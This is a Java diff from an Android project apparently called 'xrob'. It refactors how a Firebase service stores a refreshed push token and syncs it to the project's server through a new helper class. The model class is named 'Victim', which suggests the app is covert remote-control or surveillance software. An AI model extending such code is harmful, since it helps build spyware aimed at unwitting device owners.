@@ -1,9 +1,11 @@
 package com.theah64.xrob.services.firebase;
 
+import android.content.SharedPreferences;
 import android.util.Log;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.google.firebase.iid.FirebaseInstanceIdService;
+import com.theah64.xrob.asynctasks.FCMSynchronizer;
 import com.theah64.xrob.models.Victim;
 import com.theah64.xrob.utils.APIRequestBuilder;
 import com.theah64.xrob.utils.APIResponse;
@@ -30,57 +32,21 @@ public class InstanceIdService extends FirebaseInstanceIdService {
         final String newFcmId = FirebaseInstanceId.getInstance().getToken();
         Log.i(X, "Firebase token refreshed : " + newFcmId);
 
-        final PrefUtils prefUtils = PrefUtils.getInstance(this);
+        final SharedPreferences.Editor prefEditor = PrefUtils.getInstance(this).getEditor();
+        prefEditor.putString(PrefUtils.KEY_FCM_ID, newFcmId);
+        prefEditor.putBoolean(PrefUtils.KEY_IS_FCM_SYNCED, false);
+        prefEditor.commit();
 
-        prefUtils.getEditor()
-                .putString(Victim.KEY_FCM_ID, newFcmId)
-                .putBoolean(PrefUtils.IS_FCM_SYNCED, false)
-                .commit();
-
-        
         new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
             @Override
             public void onReadyToRequest(String apiKey) {
-
-                final Request fcmUpdateRequest = new APIRequestBuilder("/update/fcm", apiKey)
-                        .addParam(Victim.KEY_FCM_ID, newFcmId)
-                        .build();
-
-                OkHttpUtils.getInstance().getClient().newCall(fcmUpdateRequest).enqueue(new Callback() {
-                    @Override
-                    public void onFailure(Call call, IOException e) {
-                        e.printStackTrace();
-                    }
-
-                    @Override
-                    public void onResponse(Call call, Response response) throws IOException {
-                        try {
-                            new APIResponse(OkHttpUtils.logAndGetStringBody(response));
-                            prefUtils.getEditor()
-                                    .putBoolean(PrefUtils.IS_FCM_SYNCED, true)
-                                    .commit();
-                        } catch (JSONException | APIResponse.APIException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
-
+                new FCMSynchronizer(InstanceIdService.this, apiKey);
             }
 
             @Override
             public void onFailed(String reason) {
-                Log.e(X, "Failed to update fcm : " + reason);
+
             }
         });
-
-        final boolean isLoggedIn = prefUtils.getBoolean(PrefUtils.IS_LOGGED_IN);
-
-        if (isLoggedIn) {
-
-
-        } else {
-            Log.e(X, "Not logged in");
-        }
-
     }
 }
